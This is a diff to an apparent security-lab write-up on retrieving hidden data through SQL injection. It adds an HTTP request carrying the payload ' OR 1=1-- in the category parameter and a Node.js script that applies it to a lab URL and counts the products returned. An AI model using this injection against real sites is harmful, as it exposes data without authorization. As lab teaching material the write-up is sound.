@@ -6,28 +6,49 @@ description: >-
 
 # 1 - Retrieve Hidden Data
 
-### Hints
+### Notes
 
-<details>
+The SQLi exists in the `category` query parameter used by the category filter feature:
 
-<summary>Hint One</summary>
-
-The SQL injection vulnerability exists in the...
-
-</details>
-
-### Full Walkthrough
-
-Coming soon...
+```http
+GET /filter?category=%27+OR+1=1-- HTTP/1.1
+```
 
 ### Scripted Solution
 
-Coming soon...
+```javascript
+const { JSDOM } = require('jsdom')
+require('dotenv').config({ path: './.env' })
 
-### Security Issues & Mitigation
+/**
+ * Run exploit.
+ */
+async function main() {
+  const levelUrl = process.env.LEVEL_URL
 
-Coming soon...
+  // Get number of products visible on lab home page
+  console.log('Getting home page product count...')
+  const homeDom = await JSDOM.fromURL(levelUrl)
+  const homeProductNodes = homeDom.window.document.querySelectorAll(
+    '.container-list-tiles div'
+  )
+  console.log(`Number of home page products: ${homeProductNodes.length}.`)
 
-### Key Takeaways
+  // Get number of products after SQL injection exploit
+  console.log('Performing SQLi and getting updated product count...')
+  const SQLi = "'+OR+1=1--"
+  const SQLiDom = await JSDOM.fromURL(`${levelUrl}/filter?category=${SQLi}`)
+  const SQLiProductNodes = SQLiDom.window.document.querySelectorAll(
+    '.container-list-tiles div'
+  )
+  console.log(`Number of home page products: ${SQLiProductNodes.length}.`)
+}
 
-Coming soon...
+main()
+  .then(() => process.exit(0))
+  .catch((error) => {
+    console.error(error)
+    process.exit(1)
+  })
+java
+```
